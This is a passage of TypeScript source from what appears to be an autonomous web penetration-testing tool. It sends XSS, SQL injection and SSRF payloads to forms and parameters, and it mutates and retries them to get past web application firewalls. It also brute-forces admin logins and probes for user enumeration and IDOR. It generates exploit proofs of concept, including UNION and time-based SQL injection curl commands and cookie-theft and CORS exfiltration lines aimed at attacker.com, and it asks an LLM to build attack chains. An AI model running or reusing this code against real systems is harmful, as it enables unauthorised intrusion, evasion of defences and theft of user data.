    return techniques[Math.floor(Math.random() * techniques.length)](original);
  };

  const fireWithRetry = async (
    url: string, param: string, initialPayload: string, method: string, inputName: string
  ): Promise<Finding | null> => {
    let currentPayload = initialPayload;

    for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
      if (isPhaseExpired('injection', phaseStart, scanStart)) return null;
      try {
        let response: Response;
        if (method === 'GET') {
          const testUrl = new URL(url); testUrl.searchParams.set(param, currentPayload);
          response = await fetchWithTimeout(testUrl.toString(), 8000);
        } else {
          const formData = new URLSearchParams(); formData.set(param, currentPayload);
          response = await fetchWithTimeout(url, 8000, {
            method: 'POST', headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formData.toString()
          });
        }

        const responseText = await response.text();
        const status = response.status;
        const blocked = status === 403 || status === 406 || status === 429 ||
          responseText.toLowerCase().includes('blocked') || responseText.toLowerCase().includes('waf');

        if (!blocked) {
          const lowerBody = responseText.toLowerCase();
          // XSS
          if (responseText.includes(currentPayload) || responseText.includes('onerror=') || responseText.includes('onload=')) {
            return {
              id: `MUT-XSS-${Date.now()}-${param}`, severity: 'high',
              title: `XSS in "${inputName}" ${attempt > 0 ? `[WAF Bypassed, ${attempt + 1} mutations]` : ''}`,
              description: `Payload reflected${attempt > 0 ? ` after ${attempt + 1} mutations.` : '.'}`,
              endpoint: url, method, payload: currentPayload, owasp: 'A03:2021',
              evidence: `Reflected: ${currentPayload.slice(0, 100)}`,
              evidence2: attempt > 0 ? `Original blocked → mutated` : undefined,
              dualConfirmed: attempt > 0, remediation: 'Output encoding + CSP.',
              cwe: 'CWE-79', cvss: 6.1, confidence: attempt > 0 ? 95 : 85, category: 'injection',
              retryCount: attempt + 1,
            };
          }
          // SQLi
          if (sqlErrors.some(e => lowerBody.includes(e))) {
            return {
              id: `MUT-SQLI-${Date.now()}-${param}`, severity: 'critical',
              title: `SQLi in "${inputName}" ${attempt > 0 ? '[WAF Bypassed]' : ''}`,
              description: `SQL error triggered${attempt > 0 ? ` after ${attempt + 1} mutations.` : '.'}`,
              endpoint: url, method, payload: currentPayload, owasp: 'A03:2021',
              evidence: responseText.slice(0, 150),
              evidence2: attempt > 0 ? `Mutated from "${initialPayload}"` : undefined,
              dualConfirmed: true, remediation: 'Parameterized queries.',
              cwe: 'CWE-89', cvss: 9.8, confidence: 97, category: 'injection',
              retryCount: attempt + 1,
            };
          }
          return null; // Not blocked, but no vuln
        }

        if (attempt >= MAX_RETRIES) return null;
        currentPayload = await mutatePayload(currentPayload, `${url} param=${param}`, `HTTP ${status}`);
        await new Promise(r => setTimeout(r, 1500 + Math.random() * 2000));
      } catch {
        if (attempt >= MAX_RETRIES) return null;
        currentPayload = await mutatePayload(currentPayload, url, 'Connection error');
        await new Promise(r => setTimeout(r, 1500 + Math.random() * 2000));
      }
    }
    return null;
  };

  // Test forms
  for (const form of (forms || [])) {
    if (isPhaseExpired('injection', phaseStart, scanStart)) break;
    const formUrl = form.action ? new URL(form.action, target).toString() : target.toString();
    for (const input of form.inputs) {
      if (isPhaseExpired('injection', phaseStart, scanStart)) break;
      for (const payload of (payloads.a03_xss || []).slice(0, 5)) {
        if (failedPayloads.includes(payload)) continue;
        const finding = await fireWithRetry(formUrl, input.name, payload, form.method || 'GET', input.name);
        if (finding) { findings.push(finding); break; }
      }
      for (const payload of (payloads.a03_sqli || []).slice(0, 5)) {
        if (failedPayloads.includes(payload)) continue;
        const finding = await fireWithRetry(formUrl, input.name, payload, form.method || 'GET', input.name);
        if (finding) { findings.push(finding); break; }
      }
    }
  }

  // Test URL params
  for (const param of (params || [])) {
    if (isPhaseExpired('injection', phaseStart, scanStart)) break;
    for (const payload of (payloads.a10_ssrf || []).slice(0, 4)) {
      const finding = await fireWithRetry(target.toString(), param, payload, 'GET', param);
      if (finding) { findings.push(finding); break; }
    }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// AUTH + BUSINESS LOGIC
// ═══════════════════════════════════════════════════════════════════════════════
async function testAuthentication(target: URL, authEndpoints: string[], phaseStart: number, scanStart: number): Promise<Finding[]> {
  const findings: Finding[] = [];
  const endpoints = authEndpoints?.length > 0 ? authEndpoints :
    ['/login', '/signin', '/auth', '/api/login'].map(p => new URL(p, target).toString());

  for (const endpoint of endpoints.slice(0, 4)) {
    if (isPhaseExpired('auth', phaseStart, scanStart)) break;
    try {
      let blockedAt = 0;
      for (let i = 0; i < 12; i++) {
        try {
          const resp = await fetchWithTimeout(endpoint, 4000, {
            method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `username=admin&password=attempt${i}`
          });
          if (resp.status === 429 || resp.status === 423) { blockedAt = i + 1; break; }
        } catch { break; }
      }
      if (blockedAt === 0) {
        findings.push({
          id: `A07-BRUTE-${Date.now()}`, severity: 'high',
          title: 'No Brute Force Protection', owasp: 'A07:2021',
          description: '12+ failed logins without rate limit.',
          endpoint, method: 'POST', evidence: 'No 429 after 12 attempts',
          evidence2: 'Continued accepting', dualConfirmed: true,
          remediation: 'Rate limiting + lockout.',
          cwe: 'CWE-307', cvss: 7.5, mitre: ['T1110'], confidence: 88, category: 'auth',
        });
      }

      const [resp1, resp2] = await Promise.all([
        fetchWithTimeout(endpoint, 6000, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=admin&password=wrong' }).catch(() => null),
        fetchWithTimeout(endpoint, 6000, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=nonexistent99&password=wrong' }).catch(() => null)
      ]);
      if (resp1 && resp2) {
        const b1 = (await resp1.text()).toLowerCase();
        const b2 = (await resp2.text()).toLowerCase();
        if (b1 !== b2 && ['not found', 'invalid user', "doesn't exist"].some(k => b2.includes(k))) {
          findings.push({
            id: `A07-ENUM-${Date.now()}`, severity: 'medium',
            title: 'User Enumeration', owasp: 'A07:2021',
            description: 'Different errors for valid vs invalid users.',
            endpoint, method: 'POST', evidence: 'Different responses', evidence2: 'Username-specific',
            dualConfirmed: true, remediation: 'Generic errors.',
            cwe: 'CWE-204', confidence: 82, category: 'auth'
          });
        }
      }
    } catch {}
  }
  return findings;
}

async function testBusinessLogic(target: URL, workflows: string[]): Promise<Finding[]> {
  const findings: Finding[] = [];
  const idorPaths = ['/user/', '/profile/', '/account/', '/order/', '/invoice/', '/document/'];
  for (const path of idorPaths) {
    try {
      const [r1, r2] = await Promise.all([
        fetchWithTimeout(new URL(`${path}1`, target).toString(), 4000).catch(() => null),
        fetchWithTimeout(new URL(`${path}2`, target).toString(), 4000).catch(() => null)
      ]);
      if (r1?.status === 200 && r2?.status === 200) {
        const b1 = await r1.text();
        const b2 = await r2.text();
        if (b1 !== b2 && b1.length > 100) {
          findings.push({
            id: `A01-IDOR-${Date.now()}`, severity: 'high',
            title: `IDOR at ${path}`, owasp: 'A01:2021',
            description: 'Sequential IDs leak different data.',
            endpoint: new URL(`${path}1`, target).toString(), method: 'GET',
            evidence: 'Different responses for /1 and /2', evidence2: 'IDOR confirmed',
            dualConfirmed: true, remediation: 'Auth checks + UUIDs.',
            cwe: 'CWE-639', cvss: 7.5, mitre: ['T1078'], confidence: 80, category: 'access_control'
          });
        }
      }
    } catch {}
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// AI POC GENERATION (enhanced with curl + Python)
// ═══════════════════════════════════════════════════════════════════════════════
async function generateAIExploitPOC(findings: Finding[], fingerprint: any, apiKey: string | undefined): Promise<Finding[]> {
  for (const finding of findings) {
    const ep = finding.endpoint;
    const pl = finding.payload || '';
    const method = (finding.method || 'GET').toUpperCase();

    // Generate detailed curl POC
    if (finding.cwe === 'CWE-89') {
      finding.poc = `# ═══ SQL Injection POC ═══\n# Target: ${ep}\n# OWASP: ${finding.owasp} | CWE: ${finding.cwe} | CVSS: ${finding.cvss}\n# Confidence: ${finding.confidence}% | Dual-Confirmed: ${finding.dualConfirmed ? 'YES' : 'NO'}\n\n# Step 1: Trigger error-based SQLi\ncurl -s "${ep}"\n\n# Step 2: Boolean bypass\ncurl -s "${ep.replace(encodeURIComponent(pl), encodeURIComponent("' OR '1'='1' -- -"))}"\n\n# Step 3: UNION-based data extraction\ncurl -s "${ep.replace(encodeURIComponent(pl), encodeURIComponent("' UNION SELECT NULL,NULL,NULL--"))}"\n\n# Step 4: Time-based blind confirmation\ntime curl -s "${ep.replace(encodeURIComponent(pl), encodeURIComponent("' AND SLEEP(5) -- -"))}"`;
    } else if (finding.cwe === 'CWE-79') {
      finding.poc = `# ═══ XSS POC ═══\n# Target: ${ep}\n# Step 1: Verify reflection\ncurl -s "${ep}" | grep -o 'onerror=.*'\n\n# Step 2: Cookie theft payload\n# <script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>\n\n# Step 3: Browser reproduction\n# Open: ${ep}`;
    } else if (finding.category === 'cors') {
      finding.poc = `# ═══ CORS Exploit POC ═══\ncurl -sI "${ep}" -H "Origin: https://evil.com" | grep -i access-control\n\n# JavaScript exploit:\nfetch("${ep}",{credentials:"include",headers:{"Origin":"https://evil.com"}}).then(r=>r.text()).then(d=>fetch("https://attacker.com/steal?d="+btoa(d)))`;
    } else {
      finding.poc = `# ═══ ${finding.title} ═══\n# ${finding.owasp || ''} | CWE: ${finding.cwe || 'N/A'} | CVSS: ${finding.cvss || 'N/A'}\ncurl -X ${method} "${ep}"${pl ? `\n# Payload: ${pl}` : ''}`;
    }

    // Python exploit script
    finding.exploitCode = `#!/usr/bin/env python3\n"""\nOmniSec VAPT v7 - ${finding.title}\n${finding.owasp || ''} | CWE: ${finding.cwe || 'N/A'} | CVSS: ${finding.cvss || 'N/A'}\nDual-Confirmed: ${finding.dualConfirmed ? 'YES' : 'NO'} | Confidence: ${finding.confidence}%\n\nSteps to reproduce:\n1. Run this script: python3 exploit.py\n2. Observe the response for vulnerability indicators\n3. Verify with manual testing\n"""\nimport requests, sys, urllib3\nurllib3.disable_warnings()\n\nTARGET = "${finding.endpoint}"\nPAYLOAD = ${JSON.stringify(finding.payload || '')}\n\ndef exploit():\n    print(f"[*] Testing: {TARGET}")\n    print(f"[*] Payload: {PAYLOAD}")\n    try:\n        r = requests.${(finding.method || 'get').toLowerCase()}(\n            TARGET,\n            headers={"User-Agent": "OmniSec/7.0"},\n            timeout=15,\n            verify=False\n        )\n        print(f"[+] Status: {r.status_code}")\n        print(f"[+] Length: {len(r.text)}")\n        ${finding.cwe === 'CWE-89' ? `\n        # Check for SQL error indicators\n        sql_errors = ['sql syntax', 'mysql_fetch', 'pg_query', 'ora-']\n        for err in sql_errors:\n            if err in r.text.lower():\n                print(f"[!] VULNERABLE: SQL error found: {err}")\n                return True` : ''}\n        ${finding.cwe === 'CWE-79' ? `\n        # Check if payload is reflected\n        if PAYLOAD in r.text:\n            print("[!] VULNERABLE: Payload reflected in response")\n            return True` : ''}\n        return r.status_code < 500\n    except Exception as e:\n        print(f"[-] Error: {e}")\n        return False\n\nif __name__ == "__main__":\n    success = exploit()\n    sys.exit(0 if success else 1)\n`;
  }

  // If API key available, enhance top findings with AI-generated POC
  if (apiKey && findings.length > 0) {
    try {
      const topFindings = findings.slice(0, 3);
      const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
        method: "POST",
        headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
        body: JSON.stringify({
          model: "google/gemini-2.5-flash",
          messages: [
            { role: "system", content: "Bug bounty expert. Generate detailed step-by-step PoC for each finding. Include: 1) Impact assessment 2) Reproduction steps 3) curl commands 4) Business risk. Return JSON." },
            { role: "user", content: `Findings:\n${JSON.stringify(topFindings.map(f => ({ title: f.title, endpoint: f.endpoint, payload: f.payload, cwe: f.cwe, evidence: f.evidence })))}\n\nReturn: {"pocs":[{"id":"...","impact":"...","steps":["..."],"business_risk":"..."}]}` }
          ],
          temperature: 0.2
        }),
      });
      if (resp.ok) {
        const data = await resp.json();
        const content = data.choices?.[0]?.message?.content || '';
        const jsonMatch = content.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const result = JSON.parse(jsonMatch[0]);
          for (const poc of (result.pocs || [])) {
            const finding = topFindings.find(f => f.id === poc.id);
            if (finding && poc.steps) {
              finding.poc += `\n\n# ═══ AI-Generated Bug Bounty Report ═══\n# Impact: ${poc.impact || 'N/A'}\n# Business Risk: ${poc.business_risk || 'N/A'}\n${(poc.steps || []).map((s: string, i: number) => `# Step ${i + 1}: ${s}`).join('\n')}`;
            }
          }
        }
      }
    } catch {}
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// LEARNING + CORRELATION
// ═══════════════════════════════════════════════════════════════════════════════
async function fingerprintTarget(target: URL, discovery: any): Promise<any> {
  return {
    hostname: target.hostname, protocol: target.protocol,
    technologies: discovery.technologies || [], server: discovery.serverInfo,
    headers: discovery.headers, hasAuth: (discovery.authEndpoints?.length || 0) > 0,
    hasAPI: (discovery.apiEndpoints?.length || 0) > 0,
    formCount: discovery.forms?.length || 0, paramCount: discovery.params?.length || 0,
    shodanVulns: discovery.shodanData?.vulns || [], ports: discovery.ports || [],
  };
}

async function getFailedPayloads(supabase: any, hostname: string): Promise<string[]> {
  try {
    const { data } = await supabase.from('vapt_test_actions')
      .select('payload_sent').eq('domain', hostname).eq('outcome_label', 'blocked').limit(50);
    return data?.map((d: any) => d.payload_sent).filter(Boolean) || [];
  } catch { return []; }
}

async function loadPastSuccessfulAttacks(supabase: any, hostname: string, userId: string): Promise<any[]> {
  try {
    const { data } = await supabase.from('vapt_test_actions')
      .select('payload_sent, test_type, injection_point, target_url')
      .eq('outcome_label', 'success')
      .eq('operator_id', userId)
      .order('created_at', { ascending: false })
      .limit(30);
    return data || [];
  } catch { return []; }
}

async function saveLearningData(supabase: any, hostname: string, findings: Finding[], userId: string): Promise<void> {
  const learnable = findings.filter(f => !f.falsePositive && f.confidence >= 75);
  for (const finding of learnable.slice(0, 50)) {
    try {
      await supabase.from('vapt_test_actions').insert({
        target_url: finding.endpoint.slice(0, 500), domain: hostname,
        method: finding.method || 'GET',
        injection_point: finding.payload ? 'parameter' : null,
        test_type: (finding.id.split('-')[0] || 'vuln').toLowerCase(),
        payload_sent: finding.payload?.slice(0, 500) || null,
        transformed_payload: finding.exploitCode?.slice(0, 500) || null,
        outcome_label: finding.dualConfirmed ? 'success' : finding.confidence >= 90 ? 'partial' : 'no_effect',
        operator_id: userId,
        notes: `[${finding.confidence}% | ${finding.owasp || 'N/A'} | ${finding.dualConfirmed ? 'DUAL' : 'SINGLE'}] ${finding.title}`.slice(0, 500),
        embedding_text: `${finding.title} ${finding.description} ${finding.cwe || ''} ${finding.owasp || ''}`.slice(0, 1000),
      });
    } catch {}
  }
}

async function performAICorrelation(findings: Finding[], discovery: any, fingerprint: any, apiKey: string | undefined): Promise<any> {
  if (!apiKey || findings.length === 0) {
    return {
      attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({ name: f.title, steps: [f.description], impact: 'Critical' })),
      chainedExploits: [], recommendations: ['Remediate critical findings', 'Implement security headers', 'Enable WAF']
    };
  }
  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          { role: "system", content: "Senior pentester. Analyze findings and create attack chains. Return valid JSON only." },
          { role: "user", content: `Target: ${fingerprint.hostname}\nTech: ${(fingerprint.technologies || []).join(', ')}\nFindings: ${JSON.stringify(findings.filter(f => f.dualConfirmed).slice(0, 15))}\n\nReturn: {"attackPaths":[{"name":"...","steps":["..."],"impact":"..."}],"chainedExploits":[{"vulnerabilities":["..."],"exploitation":"...","impact":"..."}],"recommendations":["..."]}` }
        ],
        temperature: 0.2
      }),
    });
    if (resp.ok) {
      const data = await resp.json();
      const content = data.choices?.[0]?.message?.content || '';
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (jsonMatch) return JSON.parse(jsonMatch[0]);
    }
  } catch {}
  return {
    attackPaths: findings.filter(f => f.severity === 'critical').map(f => ({ name: f.title, steps: [f.description], impact: 'Critical' })),
    chainedExploits: [], recommendations: ['Remediate critical vulnerabilities']
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// UTILITY
// ═══════════════════════════════════════════════════════════════════════════════
async function fetchWithTimeout(url: string, timeout: number, options?: RequestInit): Promise<Response> {
  const controller = new AbortController();
  const tid = setTimeout(() => controller.abort(), timeout);
  try {
    const response = await fetch(url, {
      ...options, signal: controller.signal,
      headers: { "User-Agent": "OmniSec Autonomous VAPT/7.0", ...(options?.headers || {}) }
    });
    clearTimeout(tid);
    return response;
  } catch (e) {
    clearTimeout(tid);
    throw e;
  }
}
